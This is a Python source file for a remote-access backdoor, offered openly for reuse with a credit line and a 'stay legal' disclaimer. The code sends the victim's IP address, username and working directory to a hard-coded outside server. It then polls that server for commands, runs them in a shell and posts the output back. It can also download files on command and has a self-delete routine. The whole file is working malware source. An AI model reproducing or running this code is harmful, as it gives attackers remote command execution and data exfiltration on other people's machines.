'''

- Backdoor coded by @Subn3t
- Version: 1.0.4
- GitHub: https://github.com/gdsubn3t/Backdoor/
- You can use this code, but please give credits.
- Have fun and stay legal!

'''




import requests, sys, subprocess, urllib.request, platform, os, time


def download(server, url, filename):
    try:
        urllib.request.urlretrieve(url, filename)
        data = 'Sucsefully downloaded %s' %(filename)
        requests.post(server, data={'text':data})
    except:
        requests.post(server, data={'text':'Download failed'})

def welcome(server, xserver): 
	# welcome function to get the basics information
	# about the victim

	ip = requests.get('http://dxxpnxt.altervista.org/bxckdxxr/address.php').text
	name = subprocess.run('whoami', shell=True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
	name = name.stdout
	directory = os.getcwd()
	# now we got the ip addres, the username and the current path
	data = '|#| '+str(ip) + '|#|' + (bytes(name).decode("utf-8")).strip()  + '|#|' + str(directory)
	requests.post(server, data={'key':'victim', 'text':data}) # send the data 

def main(server, xserver):
	welcome(server, xserver)

	while (requests.get(xserver, timeout=1).text)[:3] == '|#|': # this loop waits for a command from the attacker
		pass

	command = ''
	oldcommand = ''

	while True: # the main loop begins
		command = requests.get(xserver).text

		if command[:3] == '$%&':
			command = command[3:]

			if not command == oldcommand:

				backdoorDir = os.getcwd()
				if command == ':exit':
					sys.exit()
				elif command[:9] == ':download':
					command, url, filename = command.split(' ')
					download(server, url, filename)
				elif command[:2] == 'cd':
					command, path = command.split(' ')
					os.chdir(path)
					backdoorDir = os.getcwd()
					requests.post(server, data={'text':backdoorDir})
				elif command == ':delete':
					if platform.system == 'Linux':
						delete = 'rm \nrm '
						os.system('echo "'+delete+'" >> deleter.sh')
						os.system('bash deleter.sh')
					elif platform.system == 'Windows':
						delete = 'del \ndel'
						os.system('echo '+delete+' >> deleter.bat')
						os.system('start deleter.bat')
				else:
					command = subprocess.run(command, shell=True, stdout = subprocess.PIPE, stderr  = subprocess.PIPE)
					response = command.stdout + command.stderr
					requests.post(server, data={'key':'victim','text':response})
					oldcommand = command





if __name__ == '__main__':
	xserver = 'http://dxxpnxt.altervista.org/bxckdxxr/file'
	server = 'http://dxxpnxt.altervista.org/bxckdxxr/uni.php'
	main(server, xserver)
